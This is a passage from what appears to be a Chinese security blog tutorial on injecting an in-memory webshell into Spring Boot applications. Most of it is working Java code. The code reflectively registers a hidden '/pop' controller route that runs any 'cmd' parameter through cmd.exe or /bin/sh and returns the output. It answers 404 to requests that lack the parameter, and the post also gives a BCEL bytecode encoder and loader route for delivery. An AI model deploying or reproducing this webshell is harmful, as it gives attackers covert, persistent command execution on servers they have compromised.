src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639839646-c915eb16-f31d-4ce6-a70c-4eaddcda7155.png#averageHue=%232b2c28&clientId=u1e300139-0fb9-4&from=paste&height=421&id=ue8010fb6&originHeight=526&originWidth=1239&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=928865&status=done&style=none&taskId=ube9d8d30-6240-499c-bb44-774162c1ed3&title=&width=991.2" alt="image.png"><br>直接就这样输出就行了。springboot的全反射内存马相对还是比较简洁的。</p><h2 id="注入部分"><a href="#注入部分" class="headerlink" title="注入部分"></a>注入部分</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">springClassload</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获得standardcontext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardcontext</span> <span class="operator">=</span> resourcesField.get(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> standardcontext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//迭代获得TomcatEmbeddedContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">TomcatEmbeddedContext</span> <span class="operator">=</span> contextField.get(standardcontext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context2Field</span> <span class="operator">=</span> TomcatEmbeddedContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context2Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取到了ApplicationContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> context2Field.get(TomcatEmbeddedContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">attributesField</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">        attributesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">attributesMap</span> <span class="operator">=</span> (ConcurrentHashMap) attributesField.get(ApplicationContext);</span><br><span class="line">        <span class="comment">//这里springboot版本偏高，低版本有所不同。获取到AnnotationConfigServletWebServerApplication</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">springRoot</span> <span class="operator">=</span> attributesMap.get(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getBean</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.context.support.AbstractApplicationContext&quot;</span>).getDeclaredMethod(<span class="string">&quot;getBean&quot;</span>, Class.class);</span><br><span class="line">        <span class="comment">//最终获取到RequestMapping，结束。接下来注册路由</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> getBean.invoke(springRoot, RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">config</span> <span class="operator">=</span> configField.get(requestMappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">paths</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>).getDeclaredMethod(<span class="string">&quot;paths&quot;</span>, String[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">options</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;options&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">build</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;build&quot;</span>);</span><br><span class="line">        paths.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        options.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        build.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder1</span> <span class="operator">=</span> paths.invoke(springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/pop&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder2</span> <span class="operator">=</span> options.invoke(builder1, config);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> build.invoke(builder2);</span><br><span class="line">        <span class="type">BcelInjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BcelInjectToController</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">shell</span> <span class="operator">=</span> BcelInjectToController.class.getMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">registerMapping</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>).getDeclaredMethod(<span class="string">&quot;registerMapping&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), Object.class, Method.class);</span><br><span class="line">        registerMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        registerMapping.invoke(requestMappingHandlerMapping,requestMappingInfo,springControllerMemShell,shell);</span><br><span class="line">        System.out.println(<span class="string">&quot;inject successfully&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们需要获取到上述说到的核心，也就是context上下文，这里通过一系列的迭代获取<code>springRoot</code>上下文，再做接下来的处理。这一部分最重要的是获取到RequestMapping，因为spring的controller内存马都是依托这个的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640075400-75d6b516-b024-477a-bc45-85ca98a2a391.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=614&id=u61f81e1e&originHeight=768&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1440372&status=done&style=none&taskId=u6733b376-047d-46a0-901b-00cf9d932da&title=&width=1054.4" alt="image.png"><br>获取到ApplicationContext，在这里其实可以做其他处理，比如注入tomcat内存马（通杀）。这个大家都不陌生，但这里是springboot，我们就按照spring内存马来。然后就是要获取spring的上下文对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640137801-e432d619-9152-4564-abb7-7bb116746e48.png#averageHue=%232f3430&clientId=u1e300139-0fb9-4&from=paste&height=549&id=ud95d3ac0&originHeight=686&originWidth=1314&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1279599&status=done&style=none&taskId=ud000e2d7-afdb-4776-a85a-7a807cbe4e8&title=&width=1051.2" alt="image.png"><br>attributesMap属性里有这个键值，取出来就好。接下来调用getbean方法，因为RequestMapping本身就被当做bean注册了。刚刚获取到的ROOT上下文实际上是<code>AnnotationConfigServletWebApplicationContext</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640288429-7ef68bcb-2ff7-42f6-9115-b190e7e40b4c.png#averageHue=%23313531&clientId=u1e300139-0fb9-4&from=paste&height=716&id=u427ae416&originHeight=895&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2479957&status=done&style=none&taskId=ucc443fb9-6de4-4929-83e4-31061e22b55&title=&width=1531.2" alt="image.png"><br>他是<code>AbstractApplicationContext</code>的实现类，所以有getBean方法可以直接获取，很方便。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640321680-6de9a96b-aba4-4562-a33e-81463a175ad8.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=588&id=u008b5ce4&originHeight=735&originWidth=1360&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1446149&status=done&style=none&taskId=u231fc957-9352-4a00-99b5-f18445382ec&title=&width=1088" alt="image.png"><br>最终也是成功获取requestmapping，后续就是反射注册路由了，有个比较坑的地方就是paths方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640382777-1828616f-cb28-4d3f-907d-ed3848dcab79.png#averageHue=%232c2c27&clientId=u1e300139-0fb9-4&from=paste&height=110&id=uaf4f7062&originHeight=137&originWidth=653&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129899&status=done&style=none&taskId=uee373895-925a-40b8-bf30-f78c7f443b6&title=&width=522.4" alt="image.png"><br>是可变的字符串类型，反射获取类方法时用字符串数组就行，关键是反射触发的时候要强转为Object<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640426386-dd42e7e5-0d41-4fff-b341-713182c733b2.png#averageHue=%232d2b25&clientId=u1e300139-0fb9-4&from=paste&height=97&id=u75a634bd&originHeight=121&originWidth=639&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106274&status=done&style=none&taskId=u72ce43b5-8d9e-4187-a077-926ee5454f6&title=&width=511.2" alt="image.png"><br>然后就是注册恶意方法了，这里也有个坑，就是BCEL其实是不会识别内部类的，所以这里我为了演示直接把恶意的Controller注册为一个类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640473051-dd7c1d89-1e3a-4682-b418-56b84fe19ab4.png#averageHue=%232d302a&clientId=u1e300139-0fb9-4&from=paste&height=270&id=ua232933e&originHeight=338&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=622593&status=done&style=none&taskId=u85821322-b92f-4f25-ac62-973a378f8aa&title=&width=1000.8" alt="image.png"><br>然后反射触发就行了。实际上我们需要把一开始的内存马编译为BCEL字节码，然后用BCEL加载器加载，然后再反射获取这个类的方法，再注册。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640597514-f8d0876b-0e2f-4313-a06b-8588f7b0e6ae.png#averageHue=%23423f38&clientId=u1e300139-0fb9-4&from=paste&height=174&id=u6660f788&originHeight=217&originWidth=1009&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30246&status=done&style=none&taskId=ufe33e608-4b82-4b09-aa7c-b0b0bb1024f&title=&width=807.2" alt="image.png"></p><h1 id="四、完整的BCEL内存马注入"><a href="#四、完整的BCEL内存马注入" class="headerlink" title="四、完整的BCEL内存马注入"></a>四、完整的BCEL内存马注入</h1><p>上述不是说需要先转为BCEL字节码吗。<br>注入路由准备如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/b1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(String code)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很简洁的一个加载，首先把刚刚第一个内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelInjectToController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">(String aaa)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">currentRequestAttributesMethod</span> <span class="operator">=</span> springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>).getMethod(<span class="string">&quot;currentRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RequestFace</span> <span class="operator">=</span> currentRequestAttributesMethod.invoke(springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getResponse</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span> getResponse.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getParameter</span> <span class="operator">=</span> request.getClass().getDeclaredMethod(<span class="string">&quot;getParameter&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sendError</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;sendError&quot;</span>,<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd= (String) getParameter.invoke(request,<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            PrintWriter writer= (PrintWriter) getWriter.invoke(response);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                sendError.invoke(response,<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Boogipop Error~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object o, String f)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredField(f);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.get(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getMV</span><span class="params">(Object o, String m)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredMethod(m);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(m);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.invoke(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译为BCEL字节码，这个的话可以写一个util去编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.spel.controller.BcelInjectToController;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.security.auth.login.Configuration;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassToBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ConvertToCode</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        JavaClass javaClass= Repository.lookupClass(BcelInjectToController.class);</span><br><span class="line">        String code= Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        code+=<span class="string">&quot;$$BCEL$$&quot;</span>;</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> ConvertToCode();</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的内存马如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelSpringMemShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelSpringMemShell</span><span class="params">(String aaa)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelSpringMemShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springClassload</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获得standardcontext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardcontext</span> <span class="operator">=</span> resourcesField.get(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> standardcontext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//迭代获得TomcatEmbeddedContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">TomcatEmbeddedContext</span> <span class="operator">=</span> contextField.get(standardcontext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context2Field</span> <span class="operator">=</span> TomcatEmbeddedContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context2Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取到了ApplicationContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> context2Field.get(TomcatEmbeddedContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">attributesField</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">        attributesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">attributesMap</span> <span class="operator">=</span> (ConcurrentHashMap) attributesField.get(ApplicationContext);</span><br><span class="line">        <span class="comment">//这里springboot版本偏高，低版本有所不同。获取到AnnotationConfigServletWebServerApplication</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">springRoot</span> <span class="operator">=</span> attributesMap.get(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getBean</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.context.support.AbstractApplicationContext&quot;</span>).getDeclaredMethod(<span class="string">&quot;getBean&quot;</span>, Class.class);</span><br><span class="line">        <span 